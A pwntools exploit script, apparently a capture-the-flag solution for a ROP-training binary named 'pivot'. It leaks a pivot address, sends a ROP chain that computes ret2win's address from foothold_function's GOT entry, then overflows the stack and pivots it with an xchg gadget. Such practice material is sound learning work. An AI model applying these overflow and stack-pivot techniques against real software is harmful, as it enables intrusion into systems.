import pwn


# Setup enviroment
process = pwn.process("./pivot")
pwn.context(os="linux", arch="amd64")
elf = pwn.ELF("pivot")
libpivot = pwn.ELF("libpivot.so")

process.readline()
process.readline()
process.readline()
process.readline()
pivot_ptr =  int(process.readline().rstrip("\n").split(": ")[1], 16)
print "Pivot pointer is at: " + hex(pivot_ptr)

# Stage 1 <--
rop = pwn.p64(elf.symbols["plt.foothold_function"])
rop += pwn.p64(elf.symbols["usefulGadgets"])             # pop rax; ret;
rop += pwn.p64(elf.symbols["got.foothold_function"])
rop += pwn.p64(elf.symbols["usefulGadgets"] + 5)         # mov rax, rax; ret;
rop += pwn.p64(elf.symbols["deregister_tm_clones"] + 48) # pop rbp; ret;
rop += pwn.p64(libpivot.symbols["ret2win"] - libpivot.symbols["foothold_function"])
rop += pwn.p64(elf.symbols["usefulGadgets"] + 9)         # add rax, rbp; ret;
rop += pwn.p64(elf.symbols["frame_dummy"] + 30)          # call rax;


print "Rop chain payload: " + rop
process.readline()
process.sendline(rop)

# Stage 2
stack_pivot = "A" * 40
stack_pivot += pwn.p64(elf.symbols["usefulGadgets"])          # pop rax; ret;
stack_pivot += pwn.p64(pivot_ptr)
stack_pivot += pwn.p64(elf.symbols["usefulGadgets"] + 2)      # xchg esp, rax; ret;

print "Stack pivot payload: " + stack_pivot
process.readline()
process.sendline(stack_pivot)
print process.readline().split(".so")[1]
